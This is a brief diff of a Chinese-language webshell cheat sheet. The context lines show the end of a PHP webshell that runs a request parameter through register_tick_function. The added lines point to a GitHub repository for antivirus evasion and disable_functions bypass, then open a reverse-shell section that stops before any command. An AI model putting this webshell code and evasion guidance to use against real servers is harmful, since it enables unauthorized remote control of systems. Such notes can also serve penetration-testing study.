@@ -154,6 +154,8 @@ declare(ticks=1);
 register_tick_function ($e, $_REQUEST['pass']);
 ?>
 ```  
+關於免殺的部分，還可以參考lemon師傅的[Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)  
+
 # Reverse shell
 目標為內網主機，外網無法發起連接。反彈shell就是webshell發起一個shell到外網，就可獲得目標的shell控制環境。  
 1. bash一句話  
